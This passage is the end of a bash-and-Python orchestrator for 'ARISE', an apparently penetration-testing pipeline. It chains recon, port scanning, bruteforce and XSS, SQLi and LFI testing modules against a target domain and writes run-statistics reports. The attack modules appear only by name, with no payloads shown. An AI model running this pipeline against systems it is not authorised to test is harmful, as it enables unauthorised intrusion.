        continue
    for fname in os.listdir(module_path):
        if fname.endswith('_results.json'):
            with open(os.path.join(module_path, fname), 'r') as f:
                try:
                    data = json.load(f)
                    if isinstance(data, dict):
                        modules[data.get('module', module_dir)] = data
                    else:
                        modules[module_dir] = data
                except (OSError, json.JSONDecodeError):
                    pass

# F38 (ARISE_REMEDIATION_ROADMAP.md): this used to call itself "External
# Attack Surface Report" while containing zero findings and zero
# remediation — a per-module run-stats dump, not a security report. The
# real narrative report (MITRE-mapped kill chains, ranked entry points, real
# evidence, concrete remediation per finding) already exists and is good —
# it's history/arise_report.py, rendered live by the dashboard's /report/
# route, which needs Flask request context (get_cached_scan_data() and
# several dashboard API views) this standalone pipeline script cannot reach.
# Rather than duplicate that logic here (or worse, leave a thin fake
# standing in for it), this stays an honestly-labeled module run-stats
# artifact for automation/CI ("did this scan complete cleanly"), and
# report.html becomes a pointer to where the real report actually lives.
report = {
    "report_info": {
        "title": "Module Run Statistics (NOT a security report — see note)",
        "note": "The narrative attack-surface report with findings, MITRE-mapped "
                "kill chains and remediation lives in the ARISE dashboard at "
                "/report/<scan_id>. This file is per-module run statistics for "
                "automation/CI use (did every module complete, how long did each take).",
        "target": target,
        "generated": datetime.now().isoformat(),
        "version": "$VERSION"
    },
    "statistics": manifest.get('statistics', {}),
    "modules": modules,
    "hosts_summary": {}
}

# Build hosts summary
for host, data in manifest.get('hosts', {}).items():
    summary = {}
    if 'ip' in data:
        summary['ip'] = data['ip']
    if 'http_status' in data:
        summary['http_status'] = data['http_status']
    if 'waf_vendor' in data:
        summary['waf_vendor'] = data['waf_vendor']
    if 'security_header_score' in data:
        summary['security_score'] = data['security_header_score']
    if 'skip_bruteforce' in data:
        summary['bruteforce_blocked'] = data['skip_bruteforce']
    report['hosts_summary'][host] = summary

# Write report
with open(os.path.join(reports_dir, "report.json"), 'w') as f:
    json.dump(report, f, indent=2)

# The scan_id the dashboard keys everything on is this scan's output dirname.
scan_id = os.path.basename(os.path.normpath(output_dir))
dash_port = os.environ.get("ARISE_DASHBOARD_PORT", "5000")
report_url = f"http://localhost:{dash_port}/report/{scan_id}"

# Write HTML: a pointer to the real report, not a stand-in for it (F38).
html = f"""<!DOCTYPE html>
<html><head><title>ARISE report — {target}</title>
<meta http-equiv="refresh" content="0; url={report_url}">
<style>
body{{font-family:Arial;margin:40px;max-width:640px}}
table{{border-collapse:collapse;width:100%;margin-top:12px}}
th,td{{border:1px solid #ddd;padding:8px;text-align:left}}
th{{background:#4CAF50;color:white}}.warning{{color:orange}}
a.btn{{display:inline-block;margin-top:8px;padding:10px 18px;background:#2563EB;
      color:white;text-decoration:none;border-radius:6px}}
</style></head><body>
<h1>ARISE report — {target}</h1>
<p>The narrative attack-surface report (findings, MITRE-mapped kill chains,
ranked entry points, remediation) is generated live by the ARISE dashboard,
not written as a static file. This page is a pointer, not the report itself.</p>
<p><a class="btn" href="{report_url}">Open the report in the ARISE dashboard &rarr;</a></p>
<p style="color:#666;font-size:13px">If that link doesn't resolve (dashboard on a
different host/port), open the dashboard and navigate to this scan, then
Report.</p>
<h2>Module run statistics (this scan)</h2>
<table>
<tr><th>Metric</th><th>Value</th></tr>
<tr><td>Total Hosts</td><td>{len(manifest.get('hosts', {}))}</td></tr>
<tr><td>Resolved Hosts</td><td>{manifest.get('statistics', {}).get('resolved_hosts', 0)}</td></tr>
<tr><td>HTTP Hosts</td><td>{manifest.get('statistics', {}).get('http_hosts', 0)}</td></tr>
<tr><td>WAF Protected</td><td class="warning">{manifest.get('statistics', {}).get('waf_hosts', 0)}</td></tr>
</table>
<h2>Modules Completed ({len(modules)})</h2>
<ul>
{"".join(f"<li>{m}</li>" for m in modules.keys())}
</ul>
</body></html>"""

with open(os.path.join(reports_dir, "report.html"), 'w') as f:
    f.write(html)

print("Reports generated successfully")
PYTHON_EOF
    
    # Generate final output filename
    local end_time=$(date +%s)
    
    log_info "Reports generated: report.json, report.html"
    echo "$OUTPUT_DIR/reports"
}
###################################################################################################
# MAIN ORCHESTRATOR
###################################################################################################

usage() {
    echo "Usage: $0 <target_domain> [options]"
    echo ""
    echo "Options:"
    echo "  -m, --mode MODE     Scan mode: full (default) | incremental | selective"
    echo "                      - full: everything from scratch; refreshes the asset ledger"
    echo "                      - incremental: full run + emits the delta (new assets) vs the ledger"
    echo "                      - selective: run ONLY --only modules against the last snapshot"
    echo "      --only MODULE   Run only this module (repeatable). Implies selective mode."
    echo "                      Seeds discovery inputs from the most recent prior snapshot."
    echo "  -s, --skip MODULE   Skip specified module (can be used multiple times)"
    echo "  -o, --output DIR    Output directory"
    echo "  -d, --debug         Enable debug mode"
    echo "  -h, --help          Show this help"
    echo ""
    echo "  ARISE_LEDGER=0      Disable durable asset-ledger ingest (default: on)"
    echo ""
    echo "Environment Variables:"
    echo "  PORT_SCAN_MODE      Port scanning mode (default: full)"
    echo "                      - fast: top 1000 ports (~5-10 min)"
    echo "                      - default: top 100 ports (fastest, ~2-5 min)"
    echo "                      - full: all 65535 ports (slow, ~1-2 hours)"
    echo "  NAABU_RATE          Packets per second (default: 3000)"
    echo "  NAABU_THREADS       Concurrent threads (default: 100)"
    echo "  PUREDNS_ENABLED     Run active puredns bruteforce (default: true; set false to skip)"
    echo "  PUREDNS_RATE_LIMIT  Public resolver DNS queries/sec (default: 100)"
    echo "  PUREDNS_TRUSTED_RATE_LIMIT Trusted resolver queries/sec (default: 25)"
    echo "  PUREDNS_WORDLIST_LIMIT Max puredns brute-force words (default: 5000)"
    echo "  PUREDNS_RESOLVER_LIMIT Max public resolvers to use (default: 50)"
    echo "  PUREDNS_THREADS     Wildcard filtering threads (default: 10)"
    echo ""
    echo "  CLOUD_ORIGIN_MAX    Max protected hosts to test for origin bypass (default: 25)"
    echo ""
    echo "Modules: asset_discovery, subdomain_enum, dns_resolution, subdomain_takeover,"
    echo "         dns_security, http_discovery, waf_detection, header_analysis, service_fingerprint,"
    echo "         directory_discovery, crawling, secret_scanning, param_fuzzing, nuclei_scan,"
    echo "         xss_testing, sqli_testing, api_security, full_port_scan, service_fingerprint,"
    echo "         shodan_correlation, internet_intel, cloud_exposure, osint_intel, reporting"
    echo ""
    echo "Examples:"
    echo "  $0 example.com"
    echo "  $0 example.com -s waf_detection -s param_fuzzing"
    echo "  $0 example.com --mode incremental          # find + attack only new assets vs ledger"
    echo "  $0 example.com --only api_security          # re-run just API security on last surface"
    echo "  $0 example.com --only sqli_testing --only xss_testing   # re-test injections only"
    echo "  PORT_SCAN_MODE=full $0 example.com    # Full port scan"
    echo "  NAABU_RATE=5000 $0 example.com        # Faster scanning"
    echo "  PUREDNS_ENABLED=false $0 example.com  # Passive enum only, no DNS bruteforce"
    echo "  PUREDNS_RATE_LIMIT=50 $0 example.com  # Lower Wi-Fi bandwidth usage"
}

main() {
    local target=""
    local skip_modules=()
    local only_modules=()
    local start_time=$(date +%s)

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                usage
                exit 0
                ;;
            -s|--skip)
                skip_modules+=("$2")
                shift 2
                ;;
            -m|--mode)
                SCAN_MODE="$2"
                shift 2
                ;;
            --only)
                only_modules+=("$2")
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -d|--debug)
                DEBUG=true
                shift
                ;;
            -*)
                log_error "Unknown option: $1"
                usage
                exit 1
                ;;
            *)
                target="$1"
                shift
                ;;
        esac
    done
    
    # Validate target
    if [ -z "$target" ]; then
        log_error "Target domain required"
        usage
        exit 1
    fi
    if ! printf '%s' "$target" | grep -Eq '^([A-Za-z0-9][A-Za-z0-9-]*\.)+[A-Za-z]{2,63}$'; then
        log_error "Invalid target domain: $target"
        exit 1
    fi

    # Validate scan mode
    case "$SCAN_MODE" in
        full|incremental|selective) ;;
        *) log_error "Invalid --mode: '$SCAN_MODE' (expected full|incremental|selective)"; exit 1 ;;
    esac
    if [ "$SCAN_MODE" = "selective" ] && [ ${#only_modules[@]} -eq 0 ]; then
        log_error "--mode selective requires at least one --only <module>"
        exit 1
    fi
    # --only implies a selective run even if --mode wasn't given
    if [ ${#only_modules[@]} -gt 0 ] && [ "$SCAN_MODE" = "full" ]; then
        SCAN_MODE="selective"
    fi

    log_section "ARISE - Summon Every Hidden Exposure. (v$VERSION)"
    log_info "Target: $target"
    log_info "Scan mode: $SCAN_MODE"
    [ ${#only_modules[@]} -gt 0 ] && log_info "Only modules: ${only_modules[*]}"
    log_info "Start time: $(date)"
    validate_runtime_limits

    # Create directories
    create_directories "$target"

    # Now that OUTPUT_DIR is known, finalize the session jar path and
    # optionally seed it from a user-supplied cookie string up front (Module
    # 20's CDP crawl adds to the same jar later; session_cookie_header()
    # re-reads it at each call site so later modules pick up both).
    ARISE_SESSION_JAR="${ARISE_SESSION_JAR:-$OUTPUT_DIR/session.jar}"
    export ARISE_SESSION_JAR
    if [ -n "${ARISE_SESSION_COOKIE:-}" ] && [ -f "$SESSION_JAR_PY" ]; then
        python3 "$SESSION_JAR_PY" --jar "$ARISE_SESSION_JAR" seed \
            --cookie "$ARISE_SESSION_COOKIE" --domain "$target" 2>/dev/null || true
    fi

    # Selective/only runs skip discovery — seed inputs from the last snapshot so
    # the chosen verification modules have a surface to work against.
    if [ "$SCAN_MODE" = "selective" ]; then
        seed_from_latest_snapshot "$target"
    fi
    
    # Check dependencies
    check_dependencies || exit 1
    
    # Download wordlists if needed
    download_wordlists
    
    # Initialize manifest
    init_manifest "$target" "$(date +%Y%m%d_%H%M%S)"

    # Crash trap (F23) — from here on, ANY exit that isn't the normal
    # completion path at the bottom of main() gets an honest terminal status
    # instead of leaving manifest.json stuck at "running" forever.
    trap _arise_crash_handler EXIT

    # Execute modules
    # Module order — api_security runs BEFORE xss_testing and sqli_testing so
    # that API URLs discovered by api_security/apisec.py/intel engine are fed back into
    # all_urls.txt first, giving XSS and SQLi full API surface coverage.
    # param_fuzzing (LFI) runs AFTER endpoint_consolidation so it can consume the
    # URL-Inventory classification (attack_routing.jsonl ssti-lfi lane) and the
    # CDP-discovered input fields (input_functions.jsonl) instead of blindly
    # fuzzing every crawled ?param=. Both files exist only after Module 20 +
    # Module 8B have run.
    # New pipeline flow (locked 2026-08-15, updated 2026-08-17, 2026-09-24, 2026-09-26):
    #  Phase 1: recon (1-4)
    #  Phase 2: PARALLEL port scan + osint + geo + takeover/dns_sec
    #    ip_geo_enrich, subdomain_takeover, dns_security, full_port_scan,
    #    osint_intel — background jobs, wait-all before next phase
    #  Phase 3: web discovery (http_discovery + everything downstream of it)
    #  Phase 4: URL inventory build, BLOCKING checkpoint at inventory
    #  Phase 3 parallel (nuclei + cloud + shodan): nuclei_scan, cloud_exposure,
    #    shodan_correlation — all read endpoint/http_hosts output, none depend on
    #    each other; cloud_exposure is purely passive so overlaps freely with nuclei
    #  Port reconcile: osint_port_reconcile + port_split now run AFTER
    #    shodan_correlation (moved 2026-09-24) — they used to run right after
    #    the initial port scan, before shodan_correlation or http_discovery had
    #    produced anything, so osint_port_reconcile's Shodan-port sources and
    #    port_split's http_confirmed.json read were both always empty. They now
    #    see real Shodan-validated ports and real per-port httpx verification.
    #  Phase 5: SEQUENTIAL attack modules (no WAF trigger)
    #  Phase 6: verification + intelligence — internet_intel now runs BEFORE
    #    attack_synth/attack_paths/autonomous_attack (moved 2026-09-26). It used
    #    to run AFTER attack_paths despite that module's own header comment
    #    saying it "runs after internet_intel so it chains VALIDATED findings" —
    #    capec_attack_paths.py's load_findings() reads
    #    23_internet_intel/intel_findings.jsonl, which didn't exist yet under
    #    the old order, so internet_intel findings never made it into any
    #    scan's attack-path graph. attack_synth has no internet_intel
    #    dependency, so it's unaffected by the move.
    #
    # NOTE: Phase 2 parallelism is orchestrated inside a dedicated wrapper
    # so a single `--only` still works predictably. Modules listed inline
    # in module_order run sequentially by default.
    local module_order=("asset_discovery" "subdomain_enum" "dns_resolution" "dns_discovery" \
                       "ip_geo_enrich" \
                       "subdomain_takeover" "dns_security" \
                       "full_port_scan" "osint_intel" \
                       "service_fingerprint" \
                       "http_discovery" "hsts_audit" \
                       "waf_detection" "tech_stack_detection" \
                       "api_deep_discovery" \
                       "directory_discovery" "crawling" "crawl_reverify" \
                       "har_ingest" "burp_bridge_ingest" "flow_reconstruct" \
                       "mcp_ai_probe" \
                       "endpoint_consolidation" \
                       "ai_recon_analysis" \
                       "identity_graph" "api_logic" \
                       "api_directory_scan" \
                       "access_control" \
                       "header_analysis" "hrs_detect" \
                       "param_fuzzing" "api_security" \
                       "xss_testing" "sqli_testing" "api_sqli_testing" \
                       "secret_scanning" \
                       "nuclei_scan" "cloud_exposure" "shodan_correlation" \
                       "osint_port_reconcile" "port_split" \
                       "nuclei_nonweb_scan" \
                       "offensive_verify" "wss_agent" "auth_oracle" \
                       "response_intel" "adaptive_loop" \
                       "internet_intel" \
                       "attack_synth" "attack_paths" "ai_analyst" \
                       "sbom" \
                       "ledger_ingest" "target_memory" "reporting")
    
    # Phase 2 parallel execution — ip_geo_enrich, subdomain_takeover, dns_security,
    # full_port_scan, osint_intel all read dns_resolution output but are otherwise
    # independent of each other and produce no target-traffic (passive/scan tasks).
    # In full-scan mode (no --only) they run in the background simultaneously.
    # In --only mode they fall through to normal sequential execution so that
    # selective runs still work predictably.
    local phase2_modules=("ip_geo_enrich" "subdomain_takeover" "dns_security" "full_port_scan" "osint_intel")
    local phase2_done=false

    # Phase 3 parallel execution — nuclei_scan, cloud_exposure, and shodan_correlation
    # are all independent: nuclei runs the web/template scan while cloud_exposure does
    # passive DNS/email-auth/CDN-bypass/SaaS fingerprinting and shodan does external
    # enrichment. None reads the others' output, so they overlap for free.
    local phase3_modules=("nuclei_scan" "cloud_exposure" "shodan_correlation")
    local phase3_done=false

    local pipeline_failed=false
    for module in "${module_order[@]}"; do
        # --only: when set, run ONLY the listed modules (skip everything else).
        # ledger_ingest is allowed through so selective runs still refresh state.
        if [ ${#only_modules[@]} -gt 0 ]; then
            local in_only=false
            for o in "${only_modules[@]}"; do
                if [ "$module" == "$o" ]; then in_only=true; break; fi
            done
            if [ "$in_only" == "false" ]; then
                continue
            fi
        fi

        # Check if module should be skipped
        local should_skip=false
        for skip in "${skip_modules[@]}"; do
            if [ "$module" == "$skip" ]; then
                should_skip=true
                break
            fi
        done

        if [ "$should_skip" == "true" ]; then
            log_warn "Skipping module: $module"
            continue
        fi
        
        # Phase 2 parallel group — only in full-scan mode (no --only filter).
        if [[ " ${phase2_modules[*]} " == *" $module "* ]] && [ ${#only_modules[@]} -eq 0 ]; then
            if $phase2_done; then
                continue  # already completed by the parallel batch below
            fi
            log_section "PHASE 2 — Launching ${#phase2_modules[@]} modules in parallel"
            local phase2_pids=()
            for _p2 in "${phase2_modules[@]}"; do
                (
                    log_section "EXECUTING [PARALLEL]: $_p2"
                    case $_p2 in
                        ip_geo_enrich)      module_ip_geo_enrich "$target" ;;
                        subdomain_takeover) module_subdomain_takeover "$target" ;;
                        dns_security)       module_dns_security "$target" ;;
                        full_port_scan)     module_full_port_scan "$target" ;;
                        osint_intel)        module_osint_intel "$target" ;;
                    esac
                ) &
                phase2_pids+=($!)
            done
            log_info "Phase 2 background PIDs: ${phase2_pids[*]} — waiting for all to finish..."
            local phase2_fail=0
            for _pid in "${phase2_pids[@]}"; do
                wait "$_pid" 2>/dev/null || phase2_fail=$(( phase2_fail + 1 ))
            done
            [ "$phase2_fail" -gt 0 ] && \
                log_warn "Phase 2: $phase2_fail module(s) returned non-zero (check individual logs)"
            log_info "Phase 2 parallel execution complete"
            phase2_done=true
            continue
        fi

        # Phase 3 parallel group — nuclei_scan + cloud_exposure + shodan_correlation.
        # Runs after endpoint_consolidation (all three need http_hosts / endpoints).
        # cloud_exposure is passive (email-auth, CDN-bypass, SaaS recon, bucket enum)
        # and does not consume nuclei output, so the overlap costs nothing.
        if [[ " ${phase3_modules[*]} " == *" $module "* ]] && [ ${#only_modules[@]} -eq 0 ]; then
            if $phase3_done; then
                continue  # already completed by the parallel batch below
            fi
            log_section "PHASE 3 — Launching ${#phase3_modules[@]} modules in parallel (nuclei + cloud + shodan)"
            local phase3_pids=()
            for _p3 in "${phase3_modules[@]}"; do
                (
                    log_section "EXECUTING [PARALLEL]: $_p3"
                    case $_p3 in
                        nuclei_scan)        module_nuclei_scan "$target" ;;
                        cloud_exposure)     module_cloud_exposure "$target" ;;
                        shodan_correlation) module_shodan_correlation "$target" ;;
                    esac
                ) &
                phase3_pids+=($!)
            done
            log_info "Phase 3 background PIDs: ${phase3_pids[*]} — waiting for all to finish..."
            local phase3_fail=0
            for _pid in "${phase3_pids[@]}"; do
                wait "$_pid" 2>/dev/null || phase3_fail=$(( phase3_fail + 1 ))
            done
            [ "$phase3_fail" -gt 0 ] && \
                log_warn "Phase 3: $phase3_fail module(s) returned non-zero (check individual logs)"
            log_info "Phase 3 parallel execution complete"
            phase3_done=true
            continue
        fi

        # Execute module
        log_section "EXECUTING: $module"
        
        case $module in
            asset_discovery)
                module_asset_discovery "$target"
                ;;
            subdomain_enum)
                module_subdomain_enum "$target"
                ;;
            dns_resolution)
                module_dns_resolution "$target"
                ;;
            dns_discovery)
                module_dns_discovery "$target"
                ;;
            subdomain_takeover)
                module_subdomain_takeover "$target"
                ;;
            dns_security)
                module_dns_security "$target"
                ;;
            http_discovery)
                module_http_discovery "$target"
                ;;
            waf_detection)
                module_waf_detection "$target"
                ;;
            header_analysis)
                module_header_analysis "$target"
                ;;
            service_fingerprint)
                module_service_fingerprint "$target"
                ;;
            shodan_correlation)
                module_shodan_correlation "$target"
                ;;
            internet_intel)
                module_internet_intel "$target"
                ;;
            attack_paths)
                module_attack_paths "$target"
                ;;
            autonomous_attack)
                module_autonomous_attack "$target"
                ;;
            ai_analyst)
                module_ai_analyst "$target"
                ;;
            directory_discovery)
                module_directory_discovery "$target"
                ;;
            hrs_detect)
                module_hrs_detect "$target"
                ;;
            crawling)
                module_crawling "$target"
                ;;
            secret_scanning)
                module_secret_scanning "$target"
                ;;
            param_fuzzing)
                module_param_fuzzing "$target"
                ;;
            nuclei_scan)
                module_nuclei_scan "$target"
                ;;
            api_deep_discovery)
                module_api_deep_discovery "$target"
                ;;
            api_sqli_testing)
                module_api_sqli_testing "$target"
                ;;
            mcp_ai_probe)
                module_mcp_ai_probe "$target"
                ;;
            endpoint_consolidation)
                module_endpoint_consolidation "$target"
                ;;
            ai_recon_analysis)
                module_ai_recon_analysis "$target"
                ;;
            attack_synth)
                module_attack_synth "$target"
                ;;
            xss_testing)
                module_xss_testing "$target"
                ;;
            sqli_testing)
                module_sqli_testing "$target"
                ;;
            api_security)
                module_api_security "$target"
                ;;
            full_port_scan)
                module_full_port_scan "$target"
                ;;
            cloud_exposure)
                module_cloud_exposure "$target"
                ;;
            osint_intel)
                module_osint_intel "$target"
                ;;
            offensive_verify)
                module_offensive_verify "$target"
                ;;
            response_intel)
                module_response_intel "$target"
                ;;
            adaptive_loop)
                module_adaptive_loop "$target"
                ;;
            ip_geo_enrich)
                module_ip_geo_enrich "$target"
                ;;
            osint_port_reconcile)
                module_osint_port_reconcile "$target"
                ;;
            port_split)
                module_port_split "$target"
                ;;
            hsts_audit)
                module_hsts_audit "$target"
                ;;
            tech_stack_detection)
                module_tech_stack_detection "$target"
                ;;
            sbom)
                module_sbom "$target"
                ;;
            crawl_reverify)
                module_crawl_reverify "$target"
                ;;
            nuclei_nonweb_scan)
                module_nuclei_nonweb_scan "$target"
                ;;
            api_directory_scan)
                module_api_directory_scan "$target"
                ;;
            access_control)
                module_access_control "$target"
                ;;
            har_ingest)
                module_har_ingest "$target"
                ;;
            burp_bridge_ingest)
                module_burp_bridge_ingest "$target"
                ;;
            flow_reconstruct)
                module_flow_reconstruct "$target"
                ;;
            identity_graph)
                module_identity_graph "$target"
                ;;
            api_logic)
                module_api_logic "$target"
                ;;
            wss_agent)
                module_wss_agent "$target"
                ;;
            auth_oracle)
                module_auth_oracle "$target"
                ;;
            target_memory)
                module_target_memory "$target"
                ;;
            extended_checks)
                # legacy alias — kept for `--only extended_checks`; the unified
                # engine (offensive_verify) is what the normal pipeline runs.
                module_offensive_verify "$target"
                ;;
            advanced_attacks)
                # legacy alias — kept for `--only advanced_attacks`.
                module_offensive_verify "$target"
                ;;
            ledger_ingest)
                module_ledger_ingest "$target"
                ;;
            reporting)
                module_reporting "$target"
                ;;
        esac
        local module_status=$?
        if [ "$module_status" -ne 0 ]; then
            pipeline_failed=true
            log_error "Module failed: $module (exit $module_status)"
        fi
    done
    
    # ── Scan health: tell "ran, found nothing" apart from "failed/empty" ──────
    # run_tool records "EXIT: <rc>" in every per-tool log. Surface non-zero exits
    # and empty key outputs so a silently broken stage is visible instead of
    # looking identical to a clean result.
    local health_file="$OUTPUT_DIR/scan_health.json"
    if [ -d "$TOOL_LOG_DIR" ] && command -v python3 &>/dev/null; then
        python3 - "$TOOL_LOG_DIR" "$OUTPUT_DIR" "$health_file" <<'HEALTH_EOF' 2>/dev/null || true
import json, os, re, sys
tool_log_dir, out_dir, health_file = sys.argv[1], sys.argv[2], sys.argv[3]
tools = {}
for fn in os.listdir(tool_log_dir):
    if not fn.endswith(".log"):
        continue
    rc = None
    try:
        with open(os.path.join(tool_log_dir, fn), errors="ignore") as fh:
            for line in fh:
                m = re.search(r"EXIT:\s*(\d+)", line)
                if m:
                    rc = int(m.group(1))
    except Exception:
        continue
    if rc is not None:
        tools[fn[:-4]] = rc
failed = sorted(k for k, v in tools.items() if v != 0)
checks = {
    "http_hosts": "04_http_discovery/http_hosts.txt",
    "crawled_urls": "09_crawling/all_urls.txt",
    "nuclei_results": "12_nuclei_scanning/nuclei_results.txt",
    "ports": "14_port_scan/all_ports.jsonl",
}
empty = [label for label, rel in checks.items()
         if not os.path.exists(os.path.join(out_dir, rel))
         or os.path.getsize(os.path.join(out_dir, rel)) == 0]
health = {"tools_run": len(tools), "tools_failed": failed, "empty_key_outputs": empty}
with open(health_file, "w") as fh:
    json.dump(health, fh, indent=2)
HEALTH_EOF
        if [ -f "$health_file" ]; then
            local n_failed n_empty
            n_failed=$(jq -r '.tools_failed | length' "$health_file" 2>/dev/null || echo 0)
            n_empty=$(jq -r '.empty_key_outputs | length' "$health_file" 2>/dev/null || echo 0)
            if [ "${n_failed:-0}" -gt 0 ] || [ "${n_empty:-0}" -gt 0 ]; then
                log_warn "Scan health: ${n_failed} tool(s) exited non-zero, ${n_empty} key output(s) empty — see scan_health.json"
                jq -r '.tools_failed[]?' "$health_file" 2>/dev/null | while read -r t; do log_warn "  tool exited non-zero: $t"; done
                jq -r '.empty_key_outputs[]?' "$health_file" 2>/dev/null | while read -r e; do log_warn "  empty output: $e"; done
            else
                log_info "Scan health: all tools exited cleanly; key outputs present"
            fi
        fi
    fi

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    log_section "PIPELINE COMPLETE"
    log_info "Target: $target"
    log_info "Duration: $duration seconds"
    log_info "Results: $OUTPUT_DIR/reports/"
    
    # Update manifest with completion. The dashboard reads this field directly.
    update_statistics "end_time" "\"$(date -Iseconds)\""
    update_statistics "duration_seconds" "$duration"
    local final_status="completed"
    [ "$pipeline_failed" = "true" ] && final_status="completed_with_errors"
    jq --arg status "$final_status" --arg endtime "$(date -Iseconds)" \
        '.pipeline_info.status = $status | .pipeline_info.end_time = $endtime' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" && \
        mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE"
    PIPELINE_STATUS_FINALIZED=true
}

# Run main
main "$@"
